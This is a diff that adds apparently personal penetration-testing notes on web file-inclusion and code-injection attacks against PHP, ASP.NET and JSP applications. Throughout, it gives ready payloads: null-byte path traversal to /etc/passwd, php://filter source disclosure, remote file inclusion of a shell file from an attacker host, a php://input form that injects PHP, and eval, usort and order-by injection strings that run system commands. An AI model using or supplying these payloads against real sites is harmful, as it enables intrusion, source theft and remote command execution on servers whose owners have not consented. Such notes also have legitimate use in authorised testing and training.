@@ -1,0 +1,79 @@
+http://site.org/example.php?page=../../../../../../../../../../../etc/passwd%00
+	notice the null byte (%00) placed after the attack string and before the argument
+	this drops any suffix/file extension automatically added by the server
+
+
+Local File Include:
+Use PHP to grab other php files for source code disclosure -> must prevent
+	PHP execution to do this.  Otherwise PHP will render content.
+	Encode to Base64, then display:
+		php://filter/read=convert.base64-encode/resource=filename
+			Base64 encoded data can't be rendered.
+		http://site.com/fileview.php?loc=/etc/passwd
+		http://site.com/fileview.php?loc=/php://filter/read=convert...
+
+
+Remote File Include:
+http://site.com/blog.php?page=http://127.0.0.1/blog.php
+	if site shows up twice you are vulnerable to RFI
+If a firewall blocks your RFI that actually calls a remote file:
+	http://atacker:53/shell.txt
+
+	<?php system('ls'); ?>    -> base64 encode this
+
+	Create a local file with:
+	<form action="http://site.com/fileview.php?loc=php://input method="post" enctype="text/plain">
+	<input type="text" name="exploit" value="<?php phpinfo(); ?>" />
+	</form>
+
+	/fileview.aspx?loc=\\attacker\mal\mal.txt
+
+
+File Inclusion and Code Execution Across Languages:
+	PHP 		require() and include()
+				code execution
+			eval()		-> when you see this in an error message code 
+					   execution is possible.  Try ' and " for leading
+					   character
+					   ".system('uname -a'); $dummy=".
+						or
+					   ".system('uname -a');# 
+					   '.system('uname -a')%3b%23
+						or 
+					   ".system('uname - a');//.
+					   ".system('uname - a')%3b//.
+						May need to URL encode # and ; symbols
+						# and // are comments
+			usort()		-> when you see this in an error message code
+					   execution is possible
+			phpinfo()	-> should be able to use the system function to 
+					   run commands
+						'.phpinfo().'
+
+
+	ASP(.NET)	Response.WriteFile()
+			no code execution
+	ASP(.NET)	Server.Execute()
+			code execution, web root access only
+	JSP		<jsp:include page="" />
+			code executino, web root access only
+
+	SQL Request
+			order by
+			We know that we need to close the statement with } and comment out 
+			the rest of the code using // or # (with encoding). We can try 
+			poking around with:
+				?ordernum=id;}//: we get an error message 
+					(Parse error: syntax error, unexpected ';'). 
+			We are probably missing one or more brackets.
+				?order=id);}//: 
+			we get a warning. 
+				?order=id));}//: 
+			we get an error message 
+				(Parse error: syntax error, unexpected ')' i). 
+			We probably have too many closing brackets.
+			Since we now know how to finish the code correctly (a warning 
+			does not stop the execution flow), we can inject arbitrary code 
+			and gain code execution using 
+				?order=id);}system('uname%20-a');// for example.	
+
